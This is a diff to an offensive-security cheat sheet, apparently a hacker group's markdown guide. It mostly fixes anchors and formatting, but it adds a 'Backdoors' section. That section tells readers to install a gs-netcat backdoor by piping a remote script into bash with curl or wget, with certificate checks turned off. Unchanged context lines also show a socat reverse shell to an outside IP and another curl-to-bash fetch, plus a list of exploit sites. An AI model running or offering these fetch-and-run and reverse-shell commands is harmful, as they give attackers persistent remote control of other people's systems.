@@ -48,7 +48,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
       1. [Upgrade a reverse shell to a pty shell](#rsup-anchor)
       1. [Upgrade a reverse shell to a fully interactive shell](#rsup2-anchor)
       1. [Reverse shell with socat (fully interactive)](#rssc-anchor)
-1. [Backdoors](#bd-anchor)
+1. [Backdoors](#backdoor)
    1. [Background reverse shell](#bdrs-anchor)
    1. [authorized_keys](#bdak-anchor)
    1. [Remote access an entire network](#bdra-anchor)
@@ -615,7 +615,18 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
 ```
 
 ---
-<a id="bd-anchor"></a>
+<a id="backdoor"></a>
+## Backdoors
+
+Mostly we use gs-netcat's automated deployment script: [https://www.gsocket.io/deploy](https://www.gsocket.io/deploy).
+```sh
+bash -c "$(curl -fsSLk gsocket.io/x)"
+```
+or
+```sh
+bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
+```
+
 <a id="bdrs-anchor"></a>
 **6.i. Background reverse shell**
 
@@ -892,7 +903,7 @@ bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ```
 
 <a id="post-hack"></a>
-**10.i. Find out Linux Distribution
+**10.i. Find out Linux Distribution**
 
 ```sh
 uname -a; lsb-release -a; cat /etc/*release /etc/issue* /proc/version
@@ -925,7 +936,7 @@ uname -a; lsb-release -a; cat /etc/*release /etc/issue* /proc/version
 **11.ii. Tools**
 
 Exploits
-1. https://github.com/liamg/traitor - Tries various exploits/vulnerabilities to gain root (LPE
+1. https://github.com/liamg/traitor - Tries various exploits/vulnerabilities to gain root (LPE)
 1. https://packetstormsecurity.com/ - Our favorite site ever since we shared a Pizza with fringe[at]dtmf.org in NYC in 2000
 1. https://www.exploit-db.com/ - Also includes metasploit db and google hacking db
 1. https://exploits.shodan.io/welcome - Similar to exploit-db
